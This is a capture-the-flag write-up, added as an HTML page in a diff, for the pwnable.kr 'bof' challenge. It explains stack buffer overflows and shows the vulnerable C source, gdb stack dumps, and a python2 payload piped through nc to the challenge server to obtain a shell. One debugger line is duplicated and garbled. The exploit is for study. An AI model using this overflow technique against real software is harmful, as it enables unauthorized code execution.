@@ -1,0 +1,99 @@
+<head>
+    <title>pwnable.kr - bof writeup + What is a buffer overflow?</title>
+</head>
+
+<body>
+    <b style="display: block; white-space: pre-wrap;">
+        So let's start by looking at the source code: 
+    </b>
+
+    <code style="display: block; white-space: pre-wrap;">
+    #include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+    </code>
+
+    We can infer that there's a buffer overflow when using the gets function.
+
+    <b style="display: block; white-space: pre-wrap;">
+        So what's a bof (Buffer OverFlow)?
+    </b>
+
+    A bof happens when we can input more than the buffer can hold. this is dangerous because A.we can crash the program but more dangerously, we can control the return address and overwrite data
+    on the stach/heap. we can also execute shellcode. Let's return to the challenge: 
+    
+    So, we can input an arbitary length string to the overflowme buffer which can only hold 32 bytes. now, we can overwrite data on the stack like the key variable. so if we overwrite the key variable
+    to 0xcafebabe, we will win. So let's calculate how long the string needs to be:
+
+    <code style="display: block; white-space: pre-wrap;">
+        Notice: lea    -0x2c(%ebp),%eax. Here is our buffer""Notice: lea    -0x2c(%ebp),%eax. Here is our buffer"Starting program: /home/yoray/Downloads/bof 
+        [Thread debugging using libthread_db enabled]
+        Using host libthread_db library "/usr/lib/libthread_db.so.1".
+
+Breakpoint 1, 0x56555654 in func ()
+0xffffd2cc:	"AAAABBBB"
+
+0xffffd2b0:	0xffffd2cc	0xf7ffcfd4	0x0000002c	0x00000000
+0xffffd2c0:	0x00000000	0x00000000	0x01000000	0x41414141
+0xffffd2d0:	0x42424242	0x01000100	0x01010101	0x00000e30
+0xffffd2e0:	0xffffd52b	0xffffffff	0x00000101	0x1b8fd500
+0xffffd2f0:	0xf7fbd3e0	0x00000000	0xffffd318	0x5655569f
+0xffffd300:	0xdeadbeef	0xffffd3d4	0xf7f9be3c	0xf7e999ab
+0xffffd310:	0xffffd549	0x00000000	0xf7ffcb80	0xf7d9c249
+0xffffd320:	0x00000001	0xffffd3d4	0xffffd3dc	0xffffd340
+0xffffd330:	0xf7f9be3c	0x5655568a	0x00000001	0xffffd3d4
+0xffffd340:	0xf7f9be3c	0xffffd3d4	0xf7ffd000	0xf7ffcb80
+0xffffd350:	0xe883c49a	0xa4a18e8a	0x00000000	0x00000000
+0xffffd360:	0x00000000	0xf7ffd000	0xf7ffcb80	0x1b8fd500
+0xffffd370:	0xf7ffda20	0xf7d9c1d6	0xf7f9be3c	0xf7d9c324
+0xffffd380:	0x00000000	0x56556ff4	0x00000001	0x56555530
+0xffffd390:	0x00000000	0xf7fd8e34	0xf7d9c29d	0x56556ff4
+
+p/d 0xffffd300 - 0xffffd2cc
+$1 = 52
+    </code>
+
+    So let's try that: 
+
+    <code style="display: block; white-space: pre-wrap;">
+        $&gt; python2 -c 'print "A"*52 + "\xbe\xba\xfe\xca"' | ./bof
+    Error: stack smashing detected
+
+    </code>
+
+    Okay great! lets try that on the nc: 
+
+    <code style="display: block; white-space: pre-wrap;">
+        *****@b0x:  Downloads$ (python2 -c 'print "A"*52 + "\xbe\xba\xfe\xca"' ; cat) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+**********************
+
+    </code>
+
+    Great we got it!
+
+    EOF
+</body>
+
